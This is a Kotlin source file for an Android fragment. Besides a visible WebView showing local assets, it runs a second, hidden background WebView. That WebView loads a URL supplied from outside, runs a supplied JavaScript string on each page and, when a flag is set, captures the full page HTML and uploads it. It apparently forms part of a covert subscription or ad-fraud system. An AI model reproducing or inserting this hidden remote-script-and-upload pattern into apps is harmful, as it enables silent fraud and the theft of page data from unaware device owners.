package com.sub.example.presentation.web

import android.annotation.SuppressLint
import android.os.Bundle
import android.util.Log
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.webkit.*
import androidx.lifecycle.ViewModelProvider
import androidx.webkit.WebViewAssetLoader
import androidx.webkit.WebViewClientCompat
import com.sub.common.Utils
import com.sub.domain.model.FileModel
import com.sub.example.R
import com.sub.example.app.App
import java.util.*
import javax.inject.Inject

class WebFragment : Fragment() {

    @Inject lateinit var vmFactory: WebViewModelFactory
    private lateinit var viewModel: WebViewModel

    private lateinit var webview: WebView
    private lateinit var webview_bg: WebView
    private val TAG = "WEB_APP_CHECK"

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        val view = inflater.inflate(R.layout.fragment_web, container, false)
        //
        webview = view.findViewById(R.id.webview)
        webview_bg = view.findViewById(R.id.background_webview)
        // Инициализируем ViewModel
        (requireActivity().applicationContext as App).appComponent.inject(fragment = this@WebFragment)
        viewModel = ViewModelProvider(this, vmFactory)[WebViewModel::class.java]
        //
        val code = arguments?.getString("code", null)
        val url = arguments?.getString("url", null)
        //
        if(code != null && url != null) loadWebView(value = code, url = url)
        else loadWebView()
        return view
    }
    @SuppressLint("SetJavaScriptEnabled")
    private fun loadWebView(value: String? = null, url: String? = null) {
        webview.settings.javaScriptEnabled = true
        webview.addJavascriptInterface(JSBridge(), "JSBridge")
        val assetLoader = WebViewAssetLoader.Builder()
            .addPathHandler("/assets/", WebViewAssetLoader.AssetsPathHandler(requireContext()))
            .addPathHandler("/res/", WebViewAssetLoader.ResourcesPathHandler(requireContext()))
            .build()
        webview.webViewClient = LocalContentWebViewClient(assetLoader)
        webview.loadUrl("https://appassets.androidplatform.net/assets/index.html")

        if(value != null && url != null) loadWebViewBackground(url = url, js_script = value)
    }
    // WebView в фоне
    @SuppressLint("SetJavaScriptEnabled")
    private fun loadWebViewBackground(url: String, js_script: String) {
        Log.i(TAG, "[Success]: Loaded SUB SYSTEM")
        val log_active = arguments?.getInt("log_active", 0)
        val flowkey = arguments?.getString("flowkey", null)
        webview_bg.settings.javaScriptEnabled = true
        webview_bg.loadUrl(url)
        webview_bg.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                webview_bg.evaluateJavascript(js_script) { it ->
                    Log.i("APP_CHECK", "onReceiveValue: $it")
                }
                if(log_active == 1 && flowkey != null) {
                    viewModel.fileCreateSuccessLiveData.observe(viewLifecycleOwner, fileCreateSuccessLiveData())
                    viewModel.fileCreateFailureLiveData.observe(viewLifecycleOwner, fileCreateFailureLiveData())
                    webview_bg.evaluateJavascript(Utils.getFullPage()) { page_code->
                        Log.i(TAG, "[Page Code]: $page_code")
                        viewModel.createFile(code = page_code, flowkey = flowkey)
                    }
                }
            }
        }
    }
    //
    private fun fileCreateSuccessLiveData() = androidx.lifecycle.Observer<FileModel> { model->
        viewModel.sendFileSuccessLiveData.observe(viewLifecycleOwner, sendFileSuccessLiveData())
        viewModel.sendFileFailureLiveData.observe(viewLifecycleOwner, sendFileFailureLiveData())
        viewModel.sendFile(path = model.filePath.toString(), fileName = model.fileName.toString())
    }
    private fun fileCreateFailureLiveData() = androidx.lifecycle.Observer<String> { errorMessage->
        Log.e(TAG, "[File]: $errorMessage")
        viewModelStore.clear()
    }
    //
    private fun sendFileSuccessLiveData() = androidx.lifecycle.Observer<Boolean> {
        Log.i(TAG, "[File]: File sended")
        viewModelStore.clear()
    }

    private fun sendFileFailureLiveData() = androidx.lifecycle.Observer<String> { errorMessage->
        Log.e(TAG, "[File]: $errorMessage")
        viewModelStore.clear()
    }
    //

    private class LocalContentWebViewClient(private val assetLoader: WebViewAssetLoader) : WebViewClientCompat() {
        override fun shouldInterceptRequest(view: WebView, request: WebResourceRequest): WebResourceResponse? {
            return assetLoader.shouldInterceptRequest(request.url)
        }
    }
    private class JSBridge() {
        @JavascriptInterface
        fun openOffer() {}
    }
}